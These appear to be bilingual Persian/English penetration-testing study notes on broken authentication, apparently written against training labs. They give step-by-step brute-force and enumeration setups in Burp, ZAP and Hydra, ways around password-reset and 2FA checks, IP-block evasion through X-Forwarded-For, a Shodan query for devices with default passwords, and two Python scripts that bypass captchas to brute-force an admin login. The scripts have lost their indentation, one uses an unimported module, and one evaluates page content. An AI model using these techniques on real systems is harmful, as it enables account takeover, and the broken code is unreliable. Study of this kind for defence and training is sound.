#  Broken Authentication

## Exploit (Authentication)
- باید تعداد thread همزمان را کنترل کنیم تا پاسخ درست برای همه request ها بیاید و payload ای را از دست ندهیم.
- **رفتار متفاوت برنامه در مواجه با نام کاربری اشتباه و رمز عبور اشتباه**
  - *صدور پیام خطای متفاوت*
    - یکی از راه های بررسی پیغام خطای متفاوت، بررسی طول متفاوت پاسخ ها می باشد
    - اگر تفاوت تابلو باشد از بخش Grep-Match استفاده کرده و نام کاربری درست را پیدا می کنیم، سپس با استفاده از کد پاسخ 302 رمز عبور درست را می یابیم
    - اگر تفاوت جزئی بود (مثلا یه نقطه کمتر بیشتر)، از Grep-Extract استفاده کرده که response را fetch می کند و همان جا می توانیم هایلایت کنیم، تا به دنبال string ما بگردد، سپس در ستون Warning از خروجی حمله، به دنبال تفاوت ها می گردیم
    - همچنین ممکن است به ازای مثلا رمز عبور درست، هیچ خطایی ندهد، که این را هم باید از بخش Warning عه Grep-Extract بررسی کنیم.
  - *زمان پاسخ طولانی تر برای نام کاربری درست*
    - درخواست لاگین را به intruder برده و یک رمز عبور طولانی (بالای 100 کاراکتر) قرار داده و نام کاربری را $ می کنیم، پس از اجرای حمله، بر روی Column کلیک کرده و آیتم های "Response received" و "Response completed" را به ستون ها اضافه می کنیم، نام کاربری که زمان پاسخ طولانی تر دارد را چند بار دیگر تست می کنیم، تا مطمئن شویم که زمان آن همیشه طولانی تر است 
  - *بلاک شدن نام کاربری درست*
    - درخواست لاگین را به Intruder برده و از حمله نوع Cluster Bomb استفاده می کنیم
    - لیست کاربران را به username می دهیم و برای password از ```$$test``` و نوع payload برابر Null payloads استفاده کرده و تعداد آن را روی 5 قرار می دهیم
    - درون response ها به دنبال طول بیشتر که نشان دهنده پیام خطای متفاوت است می گردیم تا ببینیم کدام نام کاربری بلاک شده است
- **حمله Brute Force روی کوکی stay-logged-in**
  - مقدار کوکی *stay-logged-in* را بررسی می کنیم، در این مثال به صورت ```Base64{username:MD5{password}}``` می باشد
  - درخواست صفحه ```my-account/``` را به Intruder برده و لیست password ها را برای Brute force می دهیم.
  - در بخش *Payload processing* تنظیمات زیر را اعمال می کنیم:
    - <div align="left">Hash: MD5</p>
    - <div align="left">Add prefix: carlos:</p>
    - <div align="left">Encode: Base64-encode</p> 
  - اگر بتوانیم لاگین شویم، کلید *Update Email* نمایش داده می شود، پس در بخش Grep-Match این عبارت را وارد می کنیم تا رمز عبور درست را بیابیم.
- **بهره برداری از عملکرد Reset Password**
  - با انتخاب *Forgot password?* یک ایمیل حاوی لینک ریست رمز عبور دریافت می کنیم که حاوی یک token می باشد
  - اگر token سمت سرور چک نشود، می توانیم token را از URL به طور کامل حذف کرده و در Request Body هم فقط value آن را حذف کنیم 
  - حال با تغییر username و ارسال درخواست، پسورد قربانی تغییر می کند.
- **حمله Brute Force روی Password Change** 
  - درخواست تغییر رمز عبور را به Intruder برده و بخش username را تغییر می دهیم.
  - اگر current password را اشتباه بزنیم، حساب کاربری قفل می شود، و لی اگر فیلدهای password و confirm password یکسان نباشد، دو خطای زیر را خواهیم داشت و حساب کاربری قفل نخواهد شد:
    - غلط بودن رمز عبور : Current password is incorrect 
    - درست بودن رمز عبور : New passwords do not match
  - همین تفاوت را به Grep-Match برده و Brute force می زنیم   

## Exploit (Two-Factor Authentication)
- **بررسی flow تغییر URI**
  - با یک حساب کاربری معتبر لاگین کرده و تغییر URL پس از رد شدن از 2FA را ثبت می کنیم
    - مثلا ممکن است ابتدا ```login/``` سپس ```login2/``` و در نهایت ```my-account/``` شود
  - پس از وارد کردن نام کاربری و رمز عبور قربانی، در مرحله 2FA، آدرس را تغییر می دهیم تا این مرحله بای پاس شود
- **انجام Brute Force روی 2FA**
  - درون درخواست به دنبال پارامترهایی مانند verify می گردیم، با تغییر مقدار آن به نام کاربری قربانی، مطمین می شویم که یک OTP برای قربانی ارسال می گردد
  - درخواست را به Intruder برده و از payload حالت Brute forcer استفاده می کنیم 

## Bypass
- **اگر به ازای درخواست زیاد روی IP بلاک شویم، از روش های زیر استفاده می کنیم :**
  - *هدر ```X-Forwarded-For``` را به درخواست اضافه کنیم*
    - برای ترکیب این حالت با حملات قبل، از نوع حمله Pitchfork استفاده می کنیم 
    - نوع payload برای هدر را Number قرار داده، از 1 تا 100 با پله های 1، همچنین Max fraction digits را برابر صفر قرار می دهیم
  - *ریست کردن شمارنده لاگین های ناموفق*
    - ممکن است شمارنده بلاک شدن لاگین های ناموفق، پس از یک لاگین موفق، ریست شود. در این صورت نام کاربری و رمز عبور درست متناظر با آن را لابه لای payload ها قرار می دهیم، تا از بلاک شدن جلوگیری شود.
  - *اطلاعات نام کاربری و رمز عبور به صورت JSON ارسال شود*
    - با داشتن نام کاربری، می توانیم به جای یک رمز عبور، لیستی از رمز عبور را ارسال کنیم
    - در صورتی که رمز عبور درست، درون لیست ما باشد، پاسخ 302 می گیریم و برای هدایت شدن به صفحه برنامه ، روی response راست کلیک کرده و show response in browser را انتخاب می کنیم
    - در خروجی همله به دنبال کد 302 می گردیم، و روی response راست کلیک کرده و show in browser را انتخاب می کنیم
- **دسترسی برخی مسیرها محدود به آدرس های local باشد**
  - یک درخواست به مسیر ```admin/``` ارسال می کنیم
  - از طریق تغییر متد به ```TRACE``` وجود هدرهای دیگر در Response را بررسی می کنیم
  - برای اضافه شدن هدر ```X-Custom-IP-Authorization``` به تمامی درخواست ها، به مسیر Proxy > Options رفته و و در بخش Match and Replace تنظیمات زیر را اعمال می کنیم:
    - <div align="left">Type: Request header</p>
    - <div align="left">Match: خالی</p>
    - <div align="left">Replace: X-Custom-IP-Authorization: 127.0.0.1</p>
- ی


## Burp
- Send request to Intruder
- Decode user/pass in the request
  - Right-click on the value and select "Convert selection > Base64 > Base64-decode"
  - The credentials passed to the login prompt are shown => test:123
- Replace the credentials with a parameter to be substituted => creds
- Click on the Add$ Button on the right side
- Navigate to the Payloads tab and load the 100-common-passwords.txt list
- In the Payload Processing section click on the "Add" button
- Select "Add Prefix" & Set the Prefix to "admin:"
  - Now "admin:" would be appended to each password from the list 
- Add another Payload Processing option to encode the payload to base64 
  - Select the Encode Rule as Base64-encode 
- Click on the "Start Attack" button 
- Check the Status codes of the requests and check the payload for the request with a different status code => 301
- Double click on the request entry
- Select the credentials in the Authorization header field and send them to the Decoder tab

## ZAProxy
- Click on "Manual Explore", enter the target IP address in the Input field and click on "Launch Browser" => A browser session will be started with ZAP HUD
- Click on "Continue to your target"
- Attempt login with invalid credentials => The website and the login page action will be added to the sitemap
- Click on the POST request from the sitemap and click on the "Request" tab
- Right click on the POST request, navigate to Attack and click on "Fuzz" => The Fuzzer window will appear
- Select the entered username "john" and click on the Add button => The payloads window will appear
- Click on the Add button, enter the payloads for username. Click on the Add button => Payloads: admin,bee 
- Click on the "OK" button => The payload will appear in the Fuzz Locations
- Similarly, select the entered password "doe" and click on the Add button => The payloads window will appear
- Click on the Add button, enter the payloads for password. Click on the Add button => Payloads: admin, password, adminpasswd, cookie, hello, world, bug, bee
- Click on the OK button => The payload will appear in the Fuzz Locations
- Click on Start Fuzzer. Upon completion of the attack, compare the status code => One of the status code will be 302


## Hydra (Brute force)
- ```hydra -L usernames -P passwords 192.208.137.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"```
  - ```-L```: usernames file
  - ```-P```: password file 
  - ```^USER^``` placeholder will take in the username from the list
  - ```^PASS^``` placeholder will take in the password from the list

## Crunch (Wordlist generator)
- Syntax
  - ```crunch [min]  [max] [characters] -t [pattern] -o [filename]```
- Example
  - ```crunch 6 8 123abc$ -i wordlist -t a@@@@b```
  - ```crunch 6 8 abc12 -o test.txt```

## Wordlists
- ftp://ftp.openwall.com/pub/wordlists/
- https://github.com/berzerk0/Probable-Wordlists
- http://www.openwall.com/mirrors/
- http://www.outpost9.com/files/WordLists.html
- http://www.vulnerabilityassessment.co.uk/passwords.htm
- http://packetstormsecurity.org/Crackers/wordlists/
- http://www.ai.uga.edu/ftplib/natural-language/moby/
- http://wordlist.sourceforge.net/


# Broken Authentication

## User Enumeration
- Burp => Intuder => Grep & Match: ```Incorrect```

## Password Attack
- Burp => Intruder => Attack type: Cluster Bomb

## Default Password
- Shodan => ```net:"77.36.0.0/16" cisco default password```

## Weak Lock Out Mechanism
- استفاده از قفل بازه زمانی
- Bypass with Tor

## Weaker Authentication in Alternative Channel
- Check Mobile app functionality to bypass Web app

## Image Captcha Bypass
- Extract text of image captcha, and brute force the login page
- The image tag is: ```<img id="captcha-image" src="<datauri>"></img>```
- The incorrect attempts can be identified by the "Error!" string.
- Pyton script:
  - fetch the captcha datauri and the cookie from the webpage
  - use the tesseract python module to retrieve the text from the captcha
  - iterate over the password list and send a POST request to the login endpoint along with the required POST parameters
```Python
from PIL import Image
import base64
import pytesseract
import io
import re
import requests
session = requests.Session()
regex = '<img id="captcha-image" src="(.*?)"></img>'
with open('passwords.txt','r') as f:
for password in f:
password = password.rstrip()
response = session.get('http://192.232.252.3')
output = re.search(regex, response.text)
cookies=session.cookies.get_dict()
imgstring = output.group(1).split('base64,')[-1].strip()
image_string = io.BytesIO(base64.b64decode(imgstring))
image = Image.open(image_string)
captcha=pytesseract.image_to_string(image)
print("Trying Password: "+password)
data={"username":"admin","password":password,"captcha":captcha}
output=session.post('http://192.232.252.3/login', cookies=cookies,data=data)
if("Error" not in output.text):
print("Password Found: "+password)
break
time.sleep(0.250)
```

## Math Captcha Bypass
- Extract sum of image captcha equation, and brute force the login page
- The captcha is generated between the tag: ```<h5 style="text-align: center;margin-top: 4px"> and </h5>```
- The incorrect attempts can be identified by the "Error!" string
```Python
import re
import requests
session = requests.Session()
regex = '<h5 style="text-align: center;margin-top: 4px">(.*?) = </h5>'
with open('passwords.txt','r') as f:
for password in f:
password = password.rstrip()
response = session.get('http://192.133.218.3')
output = re.search(regex, response.text)
cookies=session.cookies.get_dict()
captcha=eval(output.group(1))
print("Trying Password: "+password)
data={"username":"admin","password":password,"captcha":captcha}
output=session.post('http://192.133.218.3/login', cookies=cookies,data=data)
if("Error" not in output.text):
print("Password Found: "+password)
break
```

